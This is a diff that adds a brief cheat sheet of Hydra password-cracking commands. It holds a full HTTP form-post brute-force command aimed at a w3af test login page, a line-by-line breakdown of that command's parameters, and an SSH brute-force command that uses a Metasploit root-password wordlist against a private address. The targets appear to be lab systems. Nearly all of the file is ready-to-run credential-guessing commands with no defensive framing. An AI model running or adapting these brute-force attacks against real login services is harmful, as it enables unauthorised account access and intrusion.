@@ -1,0 +1,27 @@
+# options
+-l root or -L usernames.txt (username)
+-p password or -P passwords.lst (password)
+
+# brute force http post
+hydra 192.168.1.69 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
+
+Host = 192.168.1.69
+Method = http-form-post
+URL = /w3af/bruteforce/form_login/dataReceptor.php
+Form parameters = user=^USER^&pass=^PASS^
+Failure response = Bad login
+Users file = users.txt
+Password file = pass.txt
+Threads = -t 10
+Wait for timeout = -w 30
+Output file = -o hydra-http-post-attack.txt
+
+# ssh 
+hydra ssh://192.168.100.171:777 -L users.txt -P /usr/share/wordlists/metasploit/common_roots.txt -v
+
+
+
+
+
+
+
